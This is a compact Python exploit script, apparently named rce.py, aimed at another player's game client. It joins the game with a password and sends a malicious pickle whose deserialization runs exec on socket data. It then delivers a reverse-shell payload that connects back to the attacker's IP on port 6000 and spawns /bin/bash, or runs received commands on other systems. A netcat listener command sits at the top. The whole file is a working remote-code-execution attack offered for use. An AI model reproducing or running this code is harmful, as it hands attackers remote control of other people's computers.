# nc -lv 6000
import socket as l,pickle as P;from sys import argv as k;v,u,B,R,A,z,w,O,n=print,len,bytes,input,6000,9872,5000,'from os import name,dup2 as d;import socket as s,subprocess as p;s=s.socket();s.connect((\'{}\',{}));(name==\'posix\')and([d(s.fileno(),i)for i in[0,1,2]],p.call(\'/bin/bash\'),exit())\nwhile 1:s.send(bytes(p.getoutput(str(s.recv({}),\'utf-8\')),\'utf-8\'))','utf-8'
class s:__reduce__=lambda _:(exec,(f'exec(self._Network__sock.recv({w}))',))
u(k)!=4 and exit(v('usage: rce.py [your ip] [player ip] [password]'));o,b,V=k[1:];U=l.socket();U.connect((b,z));U.send(B(V,n));U.recv(w);v('> joined game');v('> sent exploit');D=P.dumps(s());U.send(u(D).to_bytes(2,'big')+D);R('continue? ');v('> spawning shell...');U.send(bytes(O.format(o,A,w),n))
